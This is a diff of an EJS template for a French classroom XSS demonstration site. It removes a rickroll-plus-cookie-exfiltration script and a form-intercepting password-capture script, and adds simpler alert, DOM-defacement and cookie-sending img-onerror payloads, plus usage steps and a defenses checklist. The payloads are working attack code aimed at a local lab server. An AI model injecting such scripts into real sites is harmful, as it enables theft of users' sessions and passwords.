@@ -4,438 +4,164 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title><%= title %> - XSS VADI</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/css/style.css">
 </head>
 <body>
+  <% const currentPage = 'admin'; %>
   <%- include('../partials/navbar') %>
 
-  <div class="alert alert-warning mb-0 text-center" role="alert">
-    <strong>🎵 DÉMONSTRATION RICKROLL + EXFILTRATION</strong> - Payload pédagogique
+  <div class="alert alert-warning alert-banner">
+    <span class="alert-icon">&#127925;</span>
+    <div class="alert-content">
+      <p class="alert-message"><strong>DEMONSTRATION PEDAGOGIQUE</strong> - Payloads XSS pour la classe</p>
+    </div>
   </div>
 
-  <main class="container my-5">
-    <h1 class="mb-4">🎵 Démonstration Rickroll + Exfiltration</h1>
+  <main class="container py-xl">
+    <h1 class="mb-lg">&#127925; Payloads de demonstration</h1>
 
-    <div class="alert alert-danger">
-      <h5>⚠️ ATTENTION - Usage pédagogique uniquement</h5>
-      <p class="mb-0">
-        Cette page fournit des payloads de démonstration pour illustrer comment un attaquant pourrait
-        combiner une distraction (rickroll) avec une exfiltration de données. Ces techniques ne doivent
-        JAMAIS être utilisées sans autorisation explicite.
-      </p>
+    <div class="alert alert-danger mb-xl">
+      <span class="alert-icon">&#9888;</span>
+      <div class="alert-content">
+        <p class="alert-title">Usage pedagogique uniquement</p>
+        <p class="alert-message">Ces payloads sont destines a illustrer les concepts XSS en classe. Ne JAMAIS utiliser sur des systemes sans autorisation.</p>
+      </div>
     </div>
 
-    <div class="card mb-4">
-      <div class="card-header bg-info text-white">
-        <h4 class="mb-0">📖 Concept</h4>
+    <!-- Payload 1: Alert simple -->
+    <div class="card card-success mb-lg">
+      <div class="card-header">
+        <h4>&#10003; Payload 1 : Alert simple</h4>
       </div>
       <div class="card-body">
-        <p>
-          Un attaquant peut créer un payload XSS qui :
-        </p>
+        <p class="text-secondary mb-md">Le payload le plus basique pour demontrer qu'un script s'execute.</p>
+        <div class="code-block">
+          <pre><code id="payload1">&lt;img src="x" onerror="alert('XSS Demo - Ceci est une alerte inoffensive')"&gt;</code></pre>
+        </div>
+        <button class="btn btn-success mt-md" onclick="copyPayload('payload1')">Copier</button>
+      </div>
+    </div>
+
+    <!-- Payload 2: Message visible -->
+    <div class="card card-primary mb-lg">
+      <div class="card-header">
+        <h4>&#128172; Payload 2 : Message visible</h4>
+      </div>
+      <div class="card-body">
+        <p class="text-secondary mb-md">Affiche un message sur la page pour montrer la modification du DOM.</p>
+        <div class="code-block">
+          <pre><code id="payload2">&lt;div style="background:#f85149;color:white;padding:20px;text-align:center;font-size:18px;border-radius:8px;"&gt;
+&#9888; XSS Demo - Cette page a ete modifiee par un script injecte !
+&lt;/div&gt;</code></pre>
+        </div>
+        <button class="btn btn-primary mt-md" onclick="copyPayload('payload2')">Copier</button>
+      </div>
+    </div>
+
+    <!-- Payload 3: Demo capture locale -->
+    <div class="card card-warning mb-lg">
+      <div class="card-header">
+        <h4>&#127919; Payload 3 : Demo capture demoToken (local)</h4>
+      </div>
+      <div class="card-body">
+        <p class="text-secondary mb-md">Simule une exfiltration de cookie en envoyant le demoToken au serveur local.</p>
+        <div class="alert alert-info mb-md">
+          <span class="alert-icon">&#128161;</span>
+          <div class="alert-content">
+            <p class="alert-message">Ce payload envoie UNIQUEMENT le demoToken (cookie de demo) vers /api/collect. Aucune donnee sensible n'est collectee.</p>
+          </div>
+        </div>
+        <div class="code-block">
+          <pre><code id="payload3">&lt;img src="x" onerror="
+  var token = document.cookie.match(/demoToken=([^;]+)/);
+  var user = document.cookie.match(/userName=([^;]+)/);
+  fetch('/api/collect', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      demoToken: token ? token[1] : 'NO_TOKEN',
+      userName: user ? decodeURIComponent(user[1]) : 'Unknown',
+      chapterId: location.pathname.split('/').pop()
+    })
+  });
+  alert('Demo: demoToken envoye au serveur local');
+"&gt;</code></pre>
+        </div>
+        <button class="btn btn-warning mt-md" onclick="copyPayload('payload3')">Copier</button>
+      </div>
+    </div>
+
+    <!-- Comment utiliser -->
+    <div class="card mb-lg">
+      <div class="card-header">
+        <h4>&#128218; Comment utiliser ces payloads</h4>
+      </div>
+      <div class="card-body">
         <ol>
-          <li>Affiche une distraction (vidéo, image, etc.) pour détourner l'attention</li>
-          <li>Exécute du code malveillant en arrière-plan (exfiltration de données)</li>
+          <li class="mb-md">
+            <strong>Copier le payload</strong> en cliquant sur le bouton correspondant
+          </li>
+          <li class="mb-md">
+            <strong>Retourner au <a href="/admin">panneau admin</a></strong>
+          </li>
+          <li class="mb-md">
+            <strong>Coller dans "Commentaires globaux"</strong> et publier
+          </li>
+          <li class="mb-md">
+            <strong>Se connecter en tant qu'utilisateur</strong> (autre navigateur ou navigation privee)
+          </li>
+          <li class="mb-md">
+            <strong>Visiter un chapitre</strong> pour voir le payload s'executer
+          </li>
+          <li>
+            <strong>Verifier les captures</strong> dans le panneau admin (pour le payload 3)
+          </li>
         </ol>
-        <p>
-          Dans cette démonstration, nous utilisons :
-        </p>
-        <ul>
-          <li><strong>Rickroll :</strong> Vidéo YouTube célèbre comme distraction</li>
-          <li><strong>Exfiltration :</strong> Envoi du demoToken vers /admin/collect</li>
-        </ul>
       </div>
     </div>
 
-    <div class="card mb-4">
-      <div class="card-header bg-warning">
-        <h4 class="mb-0">🧪 Payload de démonstration</h4>
+    <!-- Se proteger -->
+    <div class="card card-success mb-lg">
+      <div class="card-header">
+        <h4>&#128737; Comment se proteger ?</h4>
       </div>
       <div class="card-body">
-        <p>
-          Copiez ce payload et collez-le dans un commentaire global admin, puis visitez n'importe quel
-          chapitre en tant qu'utilisateur pour observer l'effet.
-        </p>
-
-        <div class="mb-3">
-          <label class="form-label"><strong>Payload complet :</strong></label>
-          <textarea id="payload" class="form-control" rows="25" readonly><script>
-// DÉMONSTRATION PÉDAGOGIQUE - Exfiltration du demoToken uniquement
-// Guard: ne s'exécute qu'une seule fois par session
-if (!window.__rickrollExecuted) {
-  window.__rickrollExecuted = true;
-
-  (function() {
-    // Vérifier si le rickroll n'existe pas déjà dans le DOM
-    if (document.getElementById('rickroll')) {
-      console.log('[DEMO] Rickroll déjà affiché');
-      return;
-    }
-
-    console.log('[DEMO] 🎵 Démarrage du rickroll...');
-
-    // Créer le div rickroll
-    const rickrollDiv = document.createElement('div');
-    rickrollDiv.id = 'rickroll';
-    rickrollDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;';
-
-    rickrollDiv.innerHTML = `
-      <div style="text-align:center;max-width:800px;padding:20px;">
-        <h1 style="color:#ff4444;margin-bottom:20px;font-size:2.5rem;animation:bounce 1s infinite;">
-          🎵 You've been Rickrolled! 🎵
-        </h1>
-        <img src="https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif"
-             style="width:100%;max-width:500px;border:5px solid #ff4444;border-radius:10px;margin-bottom:20px;"
-             alt="Rick Astley Dancing">
-        <br>
-        <p style="color:white;font-size:1.2rem;margin-bottom:20px;">
-          🎤 <i>Never gonna give you up, never gonna let you down...</i> 🎤
-        </p>
-        <button id="closeRickroll" style="padding:15px 30px;font-size:18px;background:#ff4444;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);transition:all 0.3s;">
-          ✖️ Fermer (Je me suis fait avoir !)
-        </button>
-        <br><br>
-        <small style="color:#999;">⚠️ Démo pédagogique XSS - Vos données ont été capturées</small>
-      </div>
-      <style>
-        @keyframes bounce {
-          0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-10px); }
-        }
-        #closeRickroll:hover {
-          background: #cc0000;
-          transform: scale(1.05);
-        }
-      </style>
-    `;
-
-    document.body.appendChild(rickrollDiv);
-
-    // Ajouter l'événement de fermeture
-    document.getElementById('closeRickroll').addEventListener('click', function() {
-      document.getElementById('rickroll').remove();
-      console.log('[DEMO] 👋 Rickroll fermé');
-    });
-
-    // EXFILTRATION DES DONNÉES
-    console.log('[DEMO] 📡 Démarrage de l\'exfiltration...');
-
-    // Extraire le demoToken du cookie
-    const cookies = document.cookie.split(';');
-    let demoToken = 'NO_TOKEN';
-    let userName = 'Unknown';
-
-    for (let cookie of cookies) {
-      const [name, value] = cookie.trim().split('=');
-      if (name === 'demoToken') {
-        demoToken = value;
-      }
-      if (name === 'userName') {
-        userName = decodeURIComponent(value);
-      }
-    }
-
-    console.log('[DEMO] 🍪 Cookies trouvés:', { demoToken, userName });
-
-    // Récupérer le chapterId de l'URL
-    const pathParts = window.location.pathname.split('/');
-    const chapterId = pathParts[pathParts.length - 1] || 'unknown';
-
-    console.log('[DEMO] 📍 ChapterId:', chapterId);
-
-    // Préparer les données à envoyer
-    const dataToSend = {
-      demoToken: demoToken,
-      userName: userName,
-      chapterId: chapterId
-    };
-
-    console.log('[DEMO] 📤 Envoi des données vers /api/collect:', dataToSend);
-
-    // Envoyer les données vers le serveur
-    fetch('/api/collect', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(dataToSend)
-    }).then(response => {
-      console.log('[DEMO] ✅ Réponse serveur:', response.status, response.statusText);
-      return response.json();
-    }).then(data => {
-      console.log('[DEMO] ✅ demoToken exfiltré avec succès !', data);
-      console.log('[DEMO] 🎯 Les données sont maintenant visibles dans le panneau admin');
-    }).catch(err => {
-      console.error('[DEMO] ❌ Erreur lors de l\'exfiltration:', err);
-    });
-  })();
-}
-</script>
-          <button class="btn btn-primary mt-2" onclick="copyPayload()">📋 Copier le payload</button>
-        </div>
-
-        <div class="alert alert-success">
-          <h5>✅ GUIDE COMPLET - Comment exfiltrer les données (étape par étape)</h5>
-
-          <h6 class="mt-3">📋 ÉTAPE 1 : Préparer le payload</h6>
-          <ol>
-            <li>Cliquez sur le bouton <strong>"📋 Copier le payload"</strong> ci-dessus</li>
-            <li>Le payload est maintenant dans votre presse-papier</li>
-          </ol>
-
-          <h6 class="mt-3">📢 ÉTAPE 2 : Publier le commentaire global (Admin)</h6>
-          <ol>
-            <li>Retournez au <a href="/admin" target="_blank"><strong>Panneau Admin</strong></a> (clic droit → Ouvrir dans un nouvel onglet)</li>
-            <li>Trouvez la section <strong>"📢 Commentaires globaux"</strong></li>
-            <li>Collez le payload dans le grand champ "Contenu du commentaire"</li>
-            <li>Cliquez sur <strong>"Publier le commentaire global"</strong></li>
-            <li>✅ Le commentaire est maintenant affiché (mais pas exécuté pour l'admin)</li>
-          </ol>
-
-          <h6 class="mt-3">👤 ÉTAPE 3 : Simuler un utilisateur victime</h6>
-          <ol>
-            <li><strong>Ouvrez un autre navigateur</strong> (Firefox, Edge, Chrome...) OU <strong>mode navigation privée</strong></li>
-            <li><strong>Si c'est le même PC :</strong> Allez sur <code>http://localhost:3000</code></li>
-            <li><strong>Si c'est un autre PC (élève) :</strong> Allez sur <code>http://157.26.174.107:3000</code>
-              <br><small class="text-muted">⚠️ Remplacez 157.26.174.107 par votre IP réelle (voir la console au démarrage du serveur)</small>
-            </li>
-            <li>Connectez-vous avec :
-              <ul>
-                <li><strong>Nom :</strong> Alice (ou n'importe quel nom)</li>
-                <li><strong>Mot de passe :</strong> toto</li>
-              </ul>
-            </li>
-            <li>Cliquez sur <strong>n'importe quel chapitre</strong> (ex: Chapitre 1)</li>
-            <li>🎵 <strong>Le rickroll apparaît automatiquement !</strong></li>
-            <li>📡 Les données sont envoyées en arrière-plan</li>
-          </ol>
-
-          <h6 class="mt-3">🎯 ÉTAPE 4 : Voir les captures dans le panneau admin</h6>
-          <ol>
-            <li>Retournez sur votre <strong>onglet admin</strong></li>
-            <li>Descendez jusqu'à la section <strong>"🎯 Captures de demoToken"</strong></li>
-            <li><strong>Attendez 3 secondes</strong> (rafraîchissement automatique)</li>
-            <li>✅ <strong>Une nouvelle ligne apparaît !</strong> avec :
-              <ul>
-                <li>Date/Heure : quand la capture a eu lieu</li>
-                <li>DemoToken : le cookie capturé (ex: DEMO-abc123)</li>
-                <li>Utilisateur : "Alice" (le nom que vous avez entré)</li>
-                <li>Chapitre : "chapter1" (le chapitre visité)</li>
-                <li>User-Agent : navigateur de la victime</li>
-              </ul>
-            </li>
-            <li>🔔 Vous devriez aussi voir une notification <strong>"✅ Nouvelle capture !"</strong> et entendre un "beep"</li>
-          </ol>
-
-          <h6 class="mt-3">🧪 ÉTAPE 5 : Tester avec plusieurs utilisateurs</h6>
-          <ol>
-            <li>Répétez l'étape 3 avec d'autres noms (Bob, Charlie, etc.)</li>
-            <li>Chaque utilisateur qui visite un chapitre génère une nouvelle capture</li>
-            <li>Toutes les captures apparaissent en temps réel dans votre panneau admin</li>
-          </ol>
-
-          <h6 class="mt-3">🔍 ÉTAPE 6 : Vérifier que ça marche (Debug)</h6>
-          <p>Si ça ne marche pas, ouvrez la <strong>Console du navigateur</strong> (F12 → Console) sur le navigateur de l'utilisateur :</p>
-          <ul>
-            <li>✅ Vous devriez voir : <code>[DEMO] 🎵 Démarrage du rickroll...</code></li>
-            <li>✅ Vous devriez voir : <code>[DEMO] 🍪 Cookies trouvés: {demoToken: "DEMO-...", userName: "Alice"}</code></li>
-            <li>✅ Vous devriez voir : <code>[DEMO] ✅ demoToken exfiltré avec succès !</code></li>
-            <li>❌ Si vous voyez une erreur 401 : l'utilisateur n'est pas connecté</li>
-            <li>❌ Si vous ne voyez rien : le payload ne s'est pas exécuté (vérifiez le commentaire global)</li>
-          </ul>
-        </div>
-      </div>
-    </div>
-
-    <div class="card mb-4 border-danger">
-      <div class="card-header bg-dark text-white">
-        <h4 class="mb-0">🔐 Payload AVANCÉ : Capture de mots de passe (Keylogger)</h4>
-      </div>
-      <div class="card-body">
-        <div class="alert alert-danger">
-          <h6>⚠️ AVERTISSEMENT RENFORCÉ</h6>
-          <p class="mb-0">
-            Ce payload capture les <strong>mots de passe</strong> saisis par les utilisateurs.
-            Il démontre à quel point XSS peut être dangereux. <strong>Usage pédagogique STRICTEMENT !</strong>
-          </p>
-        </div>
-
-        <p>
-          Ce payload intercepte le formulaire de login et capture :
-        </p>
-        <ul>
-          <li>✅ Le nom d'utilisateur</li>
-          <li>✅ Le mot de passe (en clair !)</li>
-          <li>✅ Le demoToken (cookie)</li>
-          <li>✅ L'URL visitée</li>
+        <ul class="checklist">
+          <li class="checklist-item"><strong>Echapper les entrees :</strong> Utiliser <code>&lt;%= %&gt;</code> au lieu de <code>&lt;%- %&gt;</code></li>
+          <li class="checklist-item"><strong>Sanitizer le HTML :</strong> DOMPurify ou sanitize-html</li>
+          <li class="checklist-item"><strong>Content Security Policy :</strong> Bloquer les scripts inline</li>
+          <li class="checklist-item"><strong>Cookies HttpOnly :</strong> Empecher l'acces JavaScript</li>
         </ul>
-
-        <div class="mb-3">
-          <label class="form-label"><strong>Payload Keylogger :</strong></label>
-          <textarea id="payloadKeylogger" class="form-control" rows="30" readonly><script>
-// DÉMONSTRATION PÉDAGOGIQUE - Capture de mots de passe (KEYLOGGER)
-// ⚠️ Ce script démontre les dangers du XSS - NE JAMAIS UTILISER SANS AUTORISATION
-
-if (!window.__passwordCaptureExecuted) {
-  window.__passwordCaptureExecuted = true;
-
-  (function() {
-    console.log('[KEYLOGGER] 🔐 Initialisation du keylogger...');
-
-    // 1. Intercepter TOUS les formulaires de la page
-    function interceptForms() {
-      const forms = document.querySelectorAll('form');
-      console.log('[KEYLOGGER] 📋 Formulaires détectés:', forms.length);
-
-      forms.forEach((form, index) => {
-        // Ne pas intercepter deux fois
-        if (form.dataset.intercepted) return;
-        form.dataset.intercepted = 'true';
-
-        form.addEventListener('submit', function(e) {
-          console.log('[KEYLOGGER] 📤 Formulaire #' + index + ' soumis !');
-
-          // Extraire les données du formulaire
-          const formData = new FormData(form);
-          const data = {};
-
-          for (let [key, value] of formData.entries()) {
-            data[key] = value;
-            console.log('[KEYLOGGER] 🔑 Capturé:', key, '=', value.substring(0, 3) + '***');
-          }
-
-          // Extraire le demoToken du cookie
-          const cookies = document.cookie.split(';');
-          let demoToken = 'NO_TOKEN';
-          let cookieUserName = 'Unknown';
-
-          for (let cookie of cookies) {
-            const [name, value] = cookie.trim().split('=');
-            if (name === 'demoToken') demoToken = value;
-            if (name === 'userName') cookieUserName = decodeURIComponent(value);
-          }
-
-          // Préparer les données à exfiltrer
-          const captureData = {
-            demoToken: demoToken,
-            userName: data.username || data.email || cookieUserName || 'Unknown',
-            password: data.password || 'NO_PASSWORD',
-            chapterId: window.location.pathname,
-            captureType: 'form'
-          };
-
-          console.log('[KEYLOGGER] 📡 Exfiltration des données...');
-          console.log('[KEYLOGGER] Username:', captureData.userName);
-          console.log('[KEYLOGGER] Password:', '***' + (captureData.password ? captureData.password.length : 0) + ' caractères***');
-
-          // Envoyer les données au serveur (ne pas bloquer la soumission)
-          fetch('/api/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(captureData),
-            keepalive: true // Important : continuer même si la page change
-          }).then(response => {
-            console.log('[KEYLOGGER] ✅ Données exfiltrées avec succès !');
-          }).catch(err => {
-            console.error('[KEYLOGGER] ❌ Erreur:', err);
-          });
-
-          // NE PAS empêcher la soumission normale du formulaire
-          // L'utilisateur ne se rend compte de rien !
-        });
-      });
-    }
-
-    // 2. Intercepter immédiatement
-    interceptForms();
-
-    // 3. Observer les nouveaux formulaires ajoutés dynamiquement
-    const observer = new MutationObserver(function(mutations) {
-      mutations.forEach(function(mutation) {
-        if (mutation.addedNodes.length) {
-          interceptForms();
-        }
-      });
-    });
-
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true
-    });
-
-    console.log('[KEYLOGGER] ✅ Keylogger actif - Tous les formulaires sont surveillés');
-    console.log('[KEYLOGGER] ⚠️  DÉMO PÉDAGOGIQUE - Les mots de passe sont capturés en clair');
-
-  })();
-}
-</script></textarea>
-          <button class="btn btn-danger mt-2" onclick="copyKeylogger()">📋 Copier le payload Keylogger</button>
-        </div>
-
-        <div class="alert alert-warning">
-          <h6>📝 Instructions d'utilisation du Keylogger :</h6>
-          <ol>
-            <li>Copiez le payload ci-dessus</li>
-            <li>Publiez-le comme commentaire global admin</li>
-            <li>Les élèves se connectent normalement</li>
-            <li><strong>Magie</strong> : Leurs identifiants sont capturés AVANT même qu'ils se connectent !</li>
-            <li>Vérifiez dans le panneau admin : les mots de passe apparaissent en clair</li>
-          </ol>
-        </div>
-
-        <div class="alert alert-info">
-          <h6>💡 Ce que ça démontre aux élèves :</h6>
-          <ul>
-            <li>XSS peut capturer les mots de passe en clair</li>
-            <li>L'utilisateur ne voit AUCUNE différence (pas de popup, pas d'alerte)</li>
-            <li>Le formulaire fonctionne normalement après la capture</li>
-            <li>C'est pourquoi il ne faut JAMAIS faire confiance à un site non sécurisé</li>
-            <li>C'est pourquoi les gestionnaires de mots de passe sont importants (ils vérifient le domaine)</li>
-          </ul>
-        </div>
-      </div>
-    </div>
-
-    <div class="card mb-4">
-      <div class="card-header bg-danger text-white">
-        <h4 class="mb-0">🛡️ Comment se protéger ?</h4>
-      </div>
-      <div class="card-body">
-        <ul>
-          <li><strong>Échapper les entrées utilisateur :</strong> Utiliser <code>&lt;%= %&gt;</code> au lieu de <code>&lt;%- %&gt;</code> en EJS</li>
-          <li><strong>Sanitizer le HTML :</strong> Utiliser DOMPurify ou sanitize-html</li>
-          <li><strong>Content Security Policy :</strong> Bloquer les scripts inline</li>
-          <li><strong>Cookies HttpOnly :</strong> Empêcher l'accès JavaScript aux cookies sensibles</li>
-          <li><strong>Validation des entrées :</strong> Rejeter les contenus suspects</li>
-        </ul>
-        <p class="mb-0">
-          <a href="/defense" class="btn btn-success">En savoir plus sur les défenses</a>
-        </p>
+        <a href="/defense" class="btn btn-success mt-md">Voir toutes les defenses</a>
       </div>
     </div>
 
     <div class="text-center">
-      <a href="/admin" class="btn btn-secondary">Retour au panneau admin</a>
+      <a href="/admin" class="btn btn-lg">&#8592; Retour au panneau admin</a>
     </div>
   </main>
 
   <%- include('../partials/footer') %>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="/js/app.js"></script>
   <script>
-    function copyPayload() {
-      const textarea = document.getElementById('payload');
-      textarea.select();
-      document.execCommand('copy');
-      alert('✅ Payload copié dans le presse-papier !');
-    }
-
-    function copyKeylogger() {
-      const textarea = document.getElementById('payloadKeylogger');
-      textarea.select();
-      document.execCommand('copy');
-      alert('✅ Payload Keylogger copié dans le presse-papier !');
+    function copyPayload(id) {
+      const code = document.getElementById(id).textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        ToastManager.success('Payload copie !', 2000);
+      }).catch(() => {
+        // Fallback
+        const textarea = document.createElement('textarea');
+        textarea.value = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        ToastManager.success('Payload copie !', 2000);
+      });
     }
   </script>
 </body>
